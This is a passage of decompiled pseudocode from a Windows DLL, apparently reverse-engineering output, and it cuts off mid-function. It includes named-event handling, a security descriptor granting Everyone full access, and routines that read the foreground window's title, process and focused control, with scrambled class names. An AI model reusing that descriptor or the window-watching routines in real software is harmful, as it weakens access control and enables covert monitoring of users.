  if ( !this[20] )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  if ( *((_DWORD *)this + 15) )
  {
    if ( !*((_DWORD *)this + 16) )
      (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 12))(this);
    result = (unsigned int)(*((_DWORD *)this + 16) + 1) / *((_DWORD *)this + 15);
    *((_DWORD *)this + 16) = (unsigned int)(*((_DWORD *)this + 16) + 1) % *((_DWORD *)this + 15);
  }
  return result;
}
// 10013C8D: using guessed type _DWORD pExceptionObject[2];

//----- (10013CD1) --------------------------------------------------------
int __thiscall sub_10013CD1(int this)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 24) + 112))(*(_DWORD *)(this + 24));
}
// 10013CD1: using guessed type _DWORD pExceptionObject[2];

//----- (10013CFD) --------------------------------------------------------
int __thiscall sub_10013CFD(int this, unsigned int a2)
{
  unsigned int v3; // edi
  int result; // eax
  _DWORD pExceptionObject[2]; // [esp+8h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 24) + 68))(*(_DWORD *)(this + 24));
  (*(void (__thiscall **)(_DWORD, unsigned int, _DWORD))(**(_DWORD **)(this + 24) + 64))(*(_DWORD *)(this + 24), a2, 0);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 24) + 76))(*(_DWORD *)(this + 24));
  if ( v3 <= a2 )
    return (*(int (__thiscall **)(_DWORD, unsigned int, _DWORD))(**(_DWORD **)(this + 24) + 64))(
             *(_DWORD *)(this + 24),
             v3,
             0);
  return result;
}
// 10013CFD: using guessed type _DWORD pExceptionObject[2];

//----- (10013D58) --------------------------------------------------------
char __thiscall sub_10013D58(_BYTE *this)
{
  return this[20];
}

//----- (10013D5C) --------------------------------------------------------
int __thiscall sub_10013D5C(int *this, volatile LONG *a2)
{
  volatile LONG *v3; // ecx
  int v4; // eax
  int v5; // eax
  int v7; // [esp-10h] [ebp-38h]
  volatile LONG *v8; // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-2Ch]
  void *pExceptionObject[2]; // [esp+10h] [ebp-18h] BYREF
  void *Block; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  if ( *((_BYTE *)this + 20) )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  Block = operator new(0x50u);
  v12 = 0;
  if ( Block )
  {
    v8 = v9;
    v9 = (volatile LONG *)this[4];
    v3 = (volatile LONG *)this[3];
    pExceptionObject[1] = &v8;
    v8 = v3;
    InterlockedIncrement(v9);
    LOBYTE(v12) = 1;
    v7 = this[14];
    LOBYTE(v12) = 0;
    v4 = sub_1001058F((int)Block, (int)(this + 1), this + 12, v7, 2, (int)v8, v9);
  }
  else
  {
    v4 = 0;
  }
  v12 = -1;
  sub_10013F72(this + 6, v4);
  sub_10013E27((int)this);
  (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)this[6] + 84))(this[6], this + 12, this[14]);
  v9 = a2;
  v5 = *this;
  *((_BYTE *)this + 20) = 1;
  return (*(int (__thiscall **)(int *, volatile LONG *))(v5 + 20))(this, v9);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10013E0E) --------------------------------------------------------
DWORD __thiscall sub_10013E0E(int this)
{
  int v2; // ecx

  v2 = *(_DWORD *)(this + 24);
  *(_BYTE *)(this + 20) = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 8))(v2);
  return sub_100212ED(this + 4);
}

//----- (10013E27) --------------------------------------------------------
void __usercall sub_10013E27(int a1@<esi>)
{
  int v1; // eax
  volatile LONG *v2; // ecx
  volatile LONG *v3; // ecx
  int v4; // eax
  volatile LONG *v5; // [esp-8h] [ebp-2Ch] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-28h]
  volatile LONG **v7; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v9; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 24) + 4))(*(_DWORD *)(a1 + 24));
  Block = operator new(0x14u);
  v1 = 0;
  v9 = 0;
  if ( Block )
  {
    v5 = v6;
    v6 = *(volatile LONG **)(a1 + 28);
    v2 = *(volatile LONG **)(a1 + 24);
    v7 = &v5;
    v5 = v2;
    InterlockedIncrement(v6);
    LOBYTE(v9) = 0;
    v1 = sub_10028FB6((int)Block, (int)v5, v6);
  }
  v9 = -1;
  sub_1001405B((_DWORD *)(a1 + 32), v1);
  Block = operator new(0x14u);
  v9 = 2;
  if ( Block )
  {
    v5 = v6;
    v6 = *(volatile LONG **)(a1 + 28);
    v3 = *(volatile LONG **)(a1 + 24);
    v7 = &v5;
    v5 = v3;
    InterlockedIncrement(v6);
    LOBYTE(v9) = 2;
    v4 = sub_10022209((int)Block, (int)v5, v6);
  }
  else
  {
    v4 = 0;
  }
  v9 = -1;
  sub_1001409E((_DWORD *)(a1 + 40), v4);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10013EE0) --------------------------------------------------------
int *__thiscall sub_10013EE0(void *this, int *a2)
{
  sub_10013F14(a2, (int)this + 4);
  return a2;
}

//----- (10013F14) --------------------------------------------------------
int *__cdecl sub_10013F14(int *a1, int a2)
{
  sub_1000CE26(a1, a2);
  sub_1000D47D(a1, 92);
  sub_1000D47D(a1, 58);
  sub_1000D426(a1);
  return a1;
}

//----- (10013F72) --------------------------------------------------------
void __usercall sub_10013F72(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10003CB5((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10013FBB) --------------------------------------------------------
_DWORD *__usercall sub_10013FBB@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001400B) --------------------------------------------------------
_DWORD *__usercall sub_1001400B@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001405B) --------------------------------------------------------
void __usercall sub_1001405B(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10003CDD((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001409E) --------------------------------------------------------
void __usercall sub_1001409E(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10003D05((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100140E1) --------------------------------------------------------
int __thiscall sub_100140E1(
        _DWORD *this,
        int a2,
        char a3,
        unsigned __int8 pExceptionObject,
        LPSECURITY_ATTRIBUTES lpEventAttributes)
{
  int v6; // eax
  const WCHAR *v7; // eax
  _DWORD *v8; // eax
  HANDLE EventW; // eax
  unsigned __int8 v10; // al
  _DWORD v12[3]; // [esp+10h] [ebp-24h] BYREF
  int v13[2]; // [esp+1Ch] [ebp-18h] BYREF
  int v14; // [esp+24h] [ebp-10h]
  int v15; // [esp+30h] [ebp-4h]

  v14 = 0;
  v6 = this[1];
  if ( *(_DWORD *)(v6 + 28) )
  {
    if ( a3 )
    {
      v8 = sub_100142A3(v13, (int)this);
      v15 = 0;
      v6 = v8[1];
      v14 = 1;
    }
    v7 = *(const WCHAR **)(v6 + 12);
  }
  else
  {
    v7 = 0;
  }
  EventW = CreateEventW(lpEventAttributes, pExceptionObject, 0, v7);
  sub_10014DA7((_DWORD *)a2, EventW, 0);
  v15 = 2;
  if ( (v14 & 1) != 0 )
  {
    v14 &= ~1u;
    sub_1000CE59(v13);
  }
  v10 = pExceptionObject;
  *(_DWORD *)a2 = &off_10093CB0;
  *(_BYTE *)(a2 + 8) = v10;
  if ( a3 && !*(_DWORD *)(this[1] + 28) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  if ( !*(_DWORD *)(*(_DWORD *)(a2 + 4) + 16) )
  {
    sub_100167F9(v12, 1);
    _CxxThrowException(v12, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return a2;
}
// 10093CB0: using guessed type int (__thiscall *off_10093CB0)(void *Block, char);
// 100140E1: using guessed type _DWORD var_24[3];

//----- (100141B0) --------------------------------------------------------
int *__thiscall sub_100141B0(int *Block, char a2)
{
  sub_100141CF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100141CF) --------------------------------------------------------
LONG __thiscall sub_100141CF(int *this)
{
  *this = (int)&off_10093CB0;
  return sub_10014DFB(this);
}
// 10093CB0: using guessed type int (__thiscall *off_10093CB0)(void *Block, char);

//----- (100141F3) --------------------------------------------------------
int *__stdcall sub_100141F3(int *a1, int a2)
{
  sub_10014DA7(a1, (void *)0xFFFFFFFF, 0);
  *a1 = (int)&off_10093CB0;
  sub_1001436D(a2, a1);
  return a1;
}
// 10093CB0: using guessed type int (__thiscall *off_10093CB0)(void *Block, char);

//----- (1001422C) --------------------------------------------------------
char __cdecl sub_1001422C(int a1)
{
  const WCHAR *v1; // ebx
  HANDLE v2; // eax
  DWORD v4; // [esp-8h] [ebp-3Ch]
  int CurrentProcessId; // [esp-4h] [ebp-38h]
  int v6[2]; // [esp+10h] [ebp-24h] BYREF
  _DWORD v7[6]; // [esp+18h] [ebp-1Ch] BYREF
  int v8; // [esp+30h] [ebp-4h]

  v7[2] = 0;
  sub_1000CE26(v6, a1);
  v8 = 2;
  v1 = *(const WCHAR **)(v6[1] + 12);
  CurrentProcessId = GetCurrentProcessId();
  v4 = GetCurrentProcessId();
  v2 = OpenEventW(0x1F0003u, 0, v1);
  sub_10029136(v7, v2, 0, 0, v4, CurrentProcessId);
  LOBYTE(v1) = v7[1] != 0;
  LOBYTE(v8) = 2;
  sub_10014389(v7);
  v8 = -1;
  sub_1000CE59(v6);
  return (char)v1;
}

//----- (100142A3) --------------------------------------------------------
_DWORD *__cdecl sub_100142A3(_DWORD *a1, int a2)
{
  wchar_t *v2; // eax
  _DWORD *v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  v2 = (wchar_t *)sub_1000E943((int)&unk_100B80B4);
  v3 = sub_1000CC20(v5, v2);
  v7 = 1;
  sub_1000D027(a1, (int)v3, a2);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_1000CE59(v5);
  return a1;
}

//----- (100142F5) --------------------------------------------------------
BOOL __thiscall sub_100142F5(_DWORD *this)
{
  BOOL result; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  result = SetEvent(*(HANDLE *)(this[1] + 16));
  if ( !result )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 100142F5: using guessed type _DWORD pExceptionObject[3];

//----- (10014325) --------------------------------------------------------
BOOL __thiscall sub_10014325(int this)
{
  BOOL result; // eax
  _DWORD v2[3]; // [esp+0h] [ebp-10h] BYREF
  int pExceptionObject; // [esp+Ch] [ebp-4h] BYREF

  if ( !*(_BYTE *)(this + 8) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  result = ResetEvent(*(HANDLE *)(*(_DWORD *)(this + 4) + 16));
  if ( !result )
  {
    sub_100167F9(v2, 1);
    _CxxThrowException(v2, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 10014325: using guessed type _DWORD var_10[3];

//----- (1001436D) --------------------------------------------------------
int *__usercall sub_1001436D@<eax>(int a1@<eax>, int *a2@<esi>)
{
  int v2; // edx

  v2 = *a2;
  *((_BYTE *)a2 + 8) = *(_BYTE *)(a1 + 8);
  (*(void (__thiscall **)(int *, _DWORD, int))(v2 + 12))(a2, *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16), 1);
  return a2;
}

//----- (10014389) --------------------------------------------------------
bool __thiscall sub_10014389(_DWORD *this)
{
  *this = off_10093CAC;
  return sub_100143D9((int)this);
}
// 10093CAC: using guessed type int (__thiscall *off_10093CAC[2])(void *Block, char);

//----- (100143BA) --------------------------------------------------------
_DWORD *__thiscall sub_100143BA(_DWORD *Block, char a2)
{
  sub_10014389(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100143D9) --------------------------------------------------------
bool __usercall sub_100143D9@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_100143F3(a1) )
    return 1;
  result = sub_1002915F(a1);
  *(_DWORD *)(a1 + 4) = -1;
  return result;
}

//----- (100143F3) --------------------------------------------------------
BOOL __usercall sub_100143F3@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 != -1 && v1;
}

//----- (10014406) --------------------------------------------------------
int __usercall sub_10014406@<eax>(int a1@<esi>)
{
  _DWORD *v1; // eax

  *(_DWORD *)a1 = off_10093CC8;
  v1 = operator new(0xCu);
  *(_DWORD *)(a1 + 4) = v1;
  *(_BYTE *)(a1 + 8) = 0;
  *v1 = 12;
  *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8) = 0;
  *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) = 0;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093CC8: using guessed type int (__thiscall *off_10093CC8[3])(void *Block, char);

//----- (10014431) --------------------------------------------------------
_DWORD *__thiscall sub_10014431(_DWORD *Block, char a2)
{
  sub_100145C2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001445F) --------------------------------------------------------
_DWORD *__cdecl sub_1001445F(_DWORD *a1)
{
  void *v1; // eax
  int v2; // eax
  _DWORD *v3; // eax
  bool v4; // bl
  _DWORD *result; // eax
  int pExceptionObject; // [esp+10h] [ebp-20h] BYREF
  int v7[2]; // [esp+14h] [ebp-1Ch] BYREF
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [esp+1Ch] [ebp-14h] BYREF
  int v9; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v9 = 0;
  v1 = operator new(0xCu);
  v7[1] = (int)v1;
  v10 = 1;
  if ( v1 )
    v2 = sub_10014406((int)v1);
  else
    v2 = 0;
  sub_10014632(a1, v2);
  v10 = 0;
  v9 = 1;
  v3 = sub_10014601(v7);
  v10 = 2;
  v4 = !ConvertStringSecurityDescriptorToSecurityDescriptorW(*(LPCWSTR *)(v3[1] + 12), 1u, &SecurityDescriptor, 0);
  LOBYTE(v10) = 0;
  sub_1000CE59(v7);
  if ( v4 )
  {
    sub_100167F9(&pExceptionObject, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  result = a1;
  *(_DWORD *)(*(_DWORD *)(*a1 + 4) + 4) = SecurityDescriptor;
  *(_BYTE *)(*a1 + 8) = 1;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10014512) --------------------------------------------------------
_DWORD *__cdecl sub_10014512(_DWORD *a1)
{
  _DWORD *v1; // eax

  v1 = operator new(0xCu);
  if ( v1 )
  {
    *v1 = off_10093CC8;
    v1[1] = 0;
    *((_BYTE *)v1 + 8) = 0;
  }
  else
  {
    v1 = 0;
  }
  sub_10014632(a1, (int)v1);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093CC8: using guessed type int (__thiscall *off_10093CC8[3])(void *Block, char);

//----- (10014578) --------------------------------------------------------
_DWORD *__usercall sub_10014578@<eax>(int a1@<esi>)
{
  _DWORD *result; // eax

  result = *(_DWORD **)(a1 + 4);
  if ( result )
  {
    result = (_DWORD *)result[1];
    if ( result )
    {
      if ( *(_BYTE *)(a1 + 8) )
        LocalFree(result);
      else
        j__free(result);
      result = *(_DWORD **)(a1 + 4);
      result[1] = 0;
    }
  }
  return result;
}

//----- (100145C2) --------------------------------------------------------
void __thiscall sub_100145C2(_DWORD *this)
{
  void *v2; // esi

  *this = off_10093CC8;
  sub_10014578((int)this);
  v2 = (void *)this[1];
  if ( v2 )
    j__free(v2);
}
// 10093CC8: using guessed type int (__thiscall *off_10093CC8[3])(void *Block, char);

//----- (10014601) --------------------------------------------------------
_DWORD *__cdecl sub_10014601(_DWORD *a1)
{
  sub_1000CC20(a1, L"D:(A;OICI;GA;;;WD)");
  return a1;
}
// 10092E54: using guessed type wchar_t aDAOiciGaWd[19];

//----- (10014632) --------------------------------------------------------
_DWORD *__userpurge sub_10014632@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10014671) --------------------------------------------------------
_DWORD *__userpurge sub_10014671@<eax>(_DWORD *a1@<esi>, _DWORD *a2, int a3, int a4)
{
  *a2 = off_10093CCC;
  sub_10014863(a1, a2 + 1);
  a2[5] = 10000;
  sub_100141F3(a2 + 6, a3);
  a2[9] = a4;
  return a2;
}
// 10093CCC: using guessed type int (__thiscall *off_10093CCC[2])(void *Block, char);

//----- (100146BE) --------------------------------------------------------
int *__thiscall sub_100146BE(int *Block, char a2)
{
  sub_100146DD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100146DD) --------------------------------------------------------
void *__thiscall sub_100146DD(int *this)
{
  *this = (int)off_10093CCC;
  sub_1001482C((int)this);
  sub_100141CF(this + 6);
  return sub_10004B05(this + 1);
}
// 10093CCC: using guessed type int (__thiscall *off_10093CCC[2])(void *Block, char);

//----- (10014738) --------------------------------------------------------
unsigned int __stdcall sub_10014738(int a1)
{
  unsigned int v1; // eax
  int *v2; // eax
  int v4[3]; // [esp+14h] [ebp-28h] BYREF
  int pExceptionObject; // [esp+20h] [ebp-1Ch] BYREF
  int v6; // [esp+24h] [ebp-18h] BYREF
  unsigned int i; // [esp+28h] [ebp-14h]
  int v8; // [esp+38h] [ebp-4h]

  v8 = 0;
  if ( sub_10010D5F(*(int **)(a1 + 36)) != -1 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10001520(&v6);
  LOBYTE(v8) = 1;
  sub_1000F0BC();
  for ( i = 0; ; ++i )
  {
    v1 = (*(int (__thiscall **)(int))(*(_DWORD *)(a1 + 4) + 4))(a1 + 4);
    if ( i >= v1 )
      break;
    v2 = (int *)(*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)(a1 + 4) + 44))(a1 + 4, i);
    sub_10013290(*v2, v4);
    LOBYTE(v8) = 1;
    sub_1000EA34(v4);
  }
  LOBYTE(v8) = 3;
  sub_10014E23(a1 + 24, *(_DWORD *)(a1 + 20), 0);
  LOBYTE(v8) = 0;
  sub_10001553(&v6);
  v8 = -1;
  return sub_1001482C(a1);
}
// 10014738: using guessed type int var_28[3];

//----- (1001482C) --------------------------------------------------------
unsigned int __usercall sub_1001482C@<eax>(int a1@<eax>)
{
  int v1; // esi
  unsigned int v2; // edi
  unsigned int result; // eax
  _DWORD **v4; // eax

  v1 = a1 + 4;
  v2 = 0;
  result = (*(int (__thiscall **)(int))(*(_DWORD *)(a1 + 4) + 4))(a1 + 4);
  if ( result )
  {
    do
    {
      v4 = (_DWORD **)(*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v1 + 44))(v1, v2);
      sub_10013219(*v4);
      ++v2;
      result = (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
    }
    while ( v2 < result );
  }
  return result;
}

//----- (10014863) --------------------------------------------------------
_DWORD *__userpurge sub_10014863@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  void *v5; // [esp-4h] [ebp-20h]

  sub_100050E4(a2);
  *a2 = &off_10093050;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10004DC8(a2, v2, v4, v5);
  return a2;
}
// 10093050: using guessed type int (__thiscall *off_10093050)(void *Block, char);

//----- (100148B1) --------------------------------------------------------
_DWORD *__stdcall sub_100148B1(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_10093164;
  *a1 = &off_10093CD0;
  return result;
}
// 10093164: using guessed type int (__thiscall *off_10093164)(void *Block, char);
// 10093CD0: using guessed type int (__thiscall *off_10093CD0)(void *Block, char);

//----- (100148DC) --------------------------------------------------------
_DWORD *__thiscall sub_100148DC(_DWORD *Block, char a2)
{
  sub_100148FB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100148FB) --------------------------------------------------------
void __thiscall sub_100148FB(_DWORD *this)
{
  *this = &off_10093CD0;
  *this = &off_10093164;
}
// 10093164: using guessed type int (__thiscall *off_10093164)(void *Block, char);
// 10093CD0: using guessed type int (__thiscall *off_10093CD0)(void *Block, char);

//----- (10014920) --------------------------------------------------------
int __thiscall sub_10014920(void *this, int a2)
{
  char v3; // al
  int v5; // [esp-14h] [ebp-DCh] BYREF
  int v6; // [esp-10h] [ebp-D8h]
  int v7; // [esp-Ch] [ebp-D4h]
  int v8; // [esp-8h] [ebp-D0h]
  int v9; // [esp-4h] [ebp-CCh]
  int v10[9]; // [esp+24h] [ebp-A4h] BYREF
  int v11[9]; // [esp+48h] [ebp-80h] BYREF
  _DWORD v12[4]; // [esp+6Ch] [ebp-5Ch] BYREF
  int v13[5]; // [esp+7Ch] [ebp-4Ch] BYREF
  _DWORD v14[4]; // [esp+94h] [ebp-34h] BYREF
  _DWORD v15[4]; // [esp+A4h] [ebp-24h] BYREF
  void *v16; // [esp+B4h] [ebp-14h]
  int v17; // [esp+C4h] [ebp-4h]

  v16 = this;
  sub_10017D60(v10);
  v17 = 0;
  sub_1001CC48(v12, (int)v10, 1);
  LOBYTE(v17) = 1;
  sub_10016983(0, (int)v13, 0);
  LOBYTE(v17) = 3;
  (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)this + 12))(this, v12);
  v17 = 2;
  sub_1001CC48(v15, a2, 0);
  LOBYTE(v17) = 6;
  sub_1001CD27(v15, 15);
  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v16 + 8))(v16);
  sub_1001CD27(v15, v3);
  sub_10017D60(v11);
  LOBYTE(v17) = 7;
  sub_1001CC48(v14, (int)v11, 1);
  LOBYTE(v17) = 8;
  sub_10017EAF(v10, (int)&v5);
  LOBYTE(v17) = 8;
  sub_1001CDCD(v14, v5, v6, v7, v8, v9);
  sub_10016AE9(v13, (int)&v5);
  LOBYTE(v17) = 8;
  sub_1001CDCD(v14, v5, v6, v7, v8, v9);
  sub_10017EAF(v11, (int)&v5);
  LOBYTE(v17) = 8;
  sub_1001CDCD(v15, v5, v6, v7, v8, v9);
  LOBYTE(v17) = 7;
  sub_1001CC9A(v14);
  LOBYTE(v17) = 6;
  sub_10017DC3((int)v11);
  LOBYTE(v17) = 2;
  sub_1001CC9A(v15);
  LOBYTE(v17) = 1;
  sub_10016B53(v13);
  LOBYTE(v17) = 0;
  sub_1001CC9A(v12);
  v17 = -1;
  return sub_10017DC3((int)v10);
}
// 10014920: using guessed type int var_A4[9];
// 10014920: using guessed type _DWORD var_5C[4];
// 10014920: using guessed type int var_4C[5];
// 10014920: using guessed type _DWORD var_24[4];
// 10014920: using guessed type int var_80[9];
// 10014920: using guessed type _DWORD var_34[4];

//----- (10014AD4) --------------------------------------------------------
void *__thiscall sub_10014AD4(_DWORD *this)
{
  void *result; // eax

  *this = &off_1009316C;
  result = sub_10005DA1(this + 1);
  *this = &off_10093164;
  return result;
}
// 10093164: using guessed type int (__thiscall *off_10093164)(void *Block, char);
// 1009316C: using guessed type int (__thiscall *off_1009316C)(void *Block, char);

//----- (10014B07) --------------------------------------------------------
void __thiscall sub_10014B07(_DWORD *this, char a2, int a3)
{
  (*(void (__thiscall **)(_DWORD *, char *))(this[1] + 36))(this + 1, &a2);
  sub_1000341E(&a2);
}

//----- (10014B37) --------------------------------------------------------
unsigned int __thiscall sub_10014B37(_DWORD *this, int a2)
{
  unsigned int result; // eax
  _DWORD *v3; // eax
  unsigned int i; // [esp+14h] [ebp-14h]

  for ( i = 0; ; ++i )
  {
    result = (*(int (__thiscall **)(_DWORD *))(this[1] + 4))(this + 1);
    if ( i >= result )
      break;
    v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, unsigned int))(this[1] + 44))(this + 1, i);
    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)*v3 + 4))(*v3, a2);
  }
  return result;
}

//----- (10014B92) --------------------------------------------------------
_DWORD *__cdecl sub_10014B92(_DWORD *a1)
{
  HWND ForegroundWindow; // eax
  int pExceptionObject; // [esp+14h] [ebp-14h] BYREF
  DWORD dwProcessId[3]; // [esp+18h] [ebp-10h] BYREF

  ForegroundWindow = GetForegroundWindow();
  if ( !ForegroundWindow )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  dwProcessId[0] = 0;
  GetWindowThreadProcessId(ForegroundWindow, dwProcessId);
  sub_10022A56(dwProcessId[0], a1, 0x410u);
  return a1;
}
// 10014B92: using guessed type DWORD dwProcessId[3];

//----- (10014BF7) --------------------------------------------------------
int *__cdecl sub_10014BF7(int *a1)
{
  WCHAR *v1; // eax
  int WindowTextW; // edi
  HWND pExceptionObject[4]; // [esp+14h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  pExceptionObject[0] = GetForegroundWindow();
  if ( !pExceptionObject[0] )
  {
    sub_10016441(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1000CC90(500, a1);
  v1 = (WCHAR *)sub_1000D0D9(a1);
  WindowTextW = GetWindowTextW(pExceptionObject[0], v1, 500);
  *(_WORD *)(sub_1000D0D9(a1) + 2 * WindowTextW) = 0;
  sub_1000D118((int)a1);
  return a1;
}

//----- (10014C70) --------------------------------------------------------
int sub_10014C70()
{
  struct tagGUITHREADINFO pgui; // [esp+0h] [ebp-3Ch] BYREF
  _DWORD pExceptionObject[3]; // [esp+30h] [ebp-Ch] BYREF

  pgui.cbSize = 48;
  if ( !GetGUIThreadInfo(0, &pgui) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return GetDlgCtrlID(pgui.hwndFocus);
}
// 10014C70: using guessed type _DWORD pExceptionObject[3];

//----- (10014CB0) --------------------------------------------------------
int __stdcall sub_10014CB0(int a1, void *a2, char a3)
{
  DWORD v3; // eax
  int CurrentProcessId; // [esp-4h] [ebp-20h]

  *(_DWORD *)a1 = &off_10093D08;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = off_10093CE0;
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10029136((_DWORD *)(a1 + 12), a2, a3, 0, v3, CurrentProcessId);
  return a1;
}
// 10093CE0: using guessed type int (__thiscall *off_10093CE0[6])(void *Block, char);
// 10093D08: using guessed type void (__noreturn *off_10093D08)();

//----- (10014D01) --------------------------------------------------------
_DWORD *__thiscall sub_10014D01(_DWORD *Block, char a2)
{
  sub_10014D74(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10014D20) --------------------------------------------------------
int __stdcall sub_10014D20(int a1, int a2)
{
  void *v2; // ebx
  DWORD v3; // eax
